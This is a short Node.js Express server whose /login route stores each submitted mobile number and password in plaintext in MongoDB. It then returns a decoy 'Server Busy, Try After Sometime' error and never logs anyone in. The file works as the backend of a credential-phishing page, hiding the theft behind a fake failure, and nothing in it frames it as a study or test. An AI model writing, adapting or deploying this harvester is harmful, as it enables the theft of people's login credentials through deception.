require('dotenv').config();

const express = require('express');
const mongoose = require('mongoose');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

mongoose.connect(process.env.MONGO_URI)
.then(() => console.log("MongoDB Connected"))
.catch(err => console.log("DB Error:", err));

const Login = mongoose.model('Login', {
    mobile: String,
    password: String
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/login', async (req, res) => {
    try {
        const { mobile, password } = req.body;

        await Login.create({ mobile, password });

        res.send(`
            <h2 style="text-align:center; color:red; margin-top:100px;">
                Server Busy, Try After Sometime ❌
            </h2>
        `);

    } catch (err) {
        console.log(err);
        res.send("Error");
    }
});

app.listen(PORT, () => {
    console.log(`Server listening on http://localhost:${PORT}`);
});